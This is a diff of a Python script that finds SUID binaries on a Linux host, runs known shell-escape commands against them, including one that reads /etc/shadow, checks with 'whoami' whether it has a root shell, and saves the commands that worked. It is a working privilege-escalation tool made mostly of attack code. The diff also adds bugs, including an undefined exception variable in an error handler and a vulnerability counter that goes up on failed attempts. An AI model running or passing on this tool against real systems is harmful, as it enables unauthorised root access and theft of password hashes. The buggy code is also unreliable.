@@ -57,61 +57,42 @@ suid_commands = {
         'xargs': '-a /dev/null sh -p',
         'xxd': '/etc/shadow | xxd -r'
         }
-SUID_FILE_PATH = "suids.txt"
-COMMAND_FILE_PREFIX = "command-"
 
 def save_command(cmd, file_path):
     with open(file_path, "w", encoding="utf-8") as f:
         f.write(cmd + "\n")
+        f.close()
+
 
 def locate_SUID_files():
     cmd = 'find / -perm -u=s -type f 2>/dev/null || true'
+    res = ''
     print('[*] Enumerating SUID files...')
     try:
         res = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
-        return res.splitlines()
     except subprocess.CalledProcessError as e:
-        print("[!] Error:", e)
-        return []
-
-def save_suids(suids):
-    with open(SUID_FILE_PATH, "w", encoding="utf-8") as f:
-        f.write("\n".join(suids))
-
-def run_command(cmd, print_output=False):
-    try:
-        res = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE, stdout=subprocess.PIPE, universal_newlines=True)
-        if print_output:
-            print(res.stdout.read())
-        return res
-    except Exception as e:
         print("[!] Error:", e)
         return None
 
-def check_for_root_access(res, cmd):
-    can_get_root = True
-    output = ""
-    try:
-        res.stdin.write('whoami\n')
-        res.stdin.flush()
-        output = res.stdout.readline()
-    except:
-        pass
+    return res
 
-    if "/bin/sh" not in cmd and "sh" not in cmd and "/bin/bash" not in cmd or "/etc/shadow" in cmd:
-        print(f'[-] "{cmd}" cannot get root by itself.')
-        return False
+def save_suids(suids):
+    with open("suids.txt", "w", encoding="utf-8") as f:
+        for suid in suids:
+            f.write(suid + "\n")
+        f.close()
 
-    if "root" in output and can_get_root:
-        res.stdin.write('exit\n')
-        res.stdin.flush()
-        print(f'[+] "{cmd}" got root.')
-        return True
-    elif "root" not in output and can_get_root:
-        print(f'[!] "{cmd}" is a false positive!')
-        res.terminate()
-        return False
-    return False
+def parse_result(SUID_files_res):
+    lines = SUID_files_res.splitlines()
+    suid_files = []
+    for line in lines:
+        filename = line.split("/")[-1]
+        suid_files.append(filename)
+
+    save_suids(suid_files)
+    print("[+] The following SUID files were saved to suids.txt.")
+
+    return suid_files
 
 def run_exploit(suid_files_arr):
     vulns = 0
@@ -120,18 +101,48 @@ def run_exploit(suid_files_arr):
             cmd = sfile + " " + suid_commands[sfile] + " || true"
             print('==========================================')
             print(f'[*] Running {cmd}...')
-            res = run_command(cmd, print_output=True)
-            if res:
+            try:
+                res = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE, stdout=subprocess.PIPE, universal_newlines=True)
                 print('[+] Command passed!')
                 print('[*] Checking if got root...')
-                if check_for_root_access(res, cmd):
+                output = ""
+                try:
+                    res.stdin.write('whoami\n')
+                    res.stdin.flush()
+                    output = res.stdout.readline()
+                except:
+                    continue
+
+                can_get_root = True
+
+                if "/bin/sh" not in cmd and "sh" not in cmd and "/bin/bash" not in cmd or "/etc/shadow" in cmd:
+                    print(f'[-] "{cmd}" cannot get root by itself.')
                     vulns += 1
-                save_command(cmd, f"{COMMAND_FILE_PREFIX}{vulns + 1}")
+                    can_get_root = False
+                    
+                if "root" in output and can_get_root:
+                    res.stdin.write('exit\n')
+                    res.stdin.flush()
+                    print(f'[+] "{cmd}" got root.')
+                    vulns += 1
+                elif "root" not in output and can_get_root:
+                    print(f'[!] "{cmd}" is a false positive!')
+                    res.terminate()
+                    continue
+                
+                save_command(cmd, f"command-{vulns+1}")
                 cin = str(input("Do you want to continue the exploit? [y/n]: "))
-                if cin.lower() != 'y':
+                if cin.lower() == 'y':
+                    continue
+                else:
                     print("[*] Quitting...")
                     break
+            except:
+                print("[!] Error:", e)
+                continue
 
+            res.terminate()
+    
     print(f"[-] Exploit finished. Found {vulns} vulnerabilities")
 
 res = locate_SUID_files()
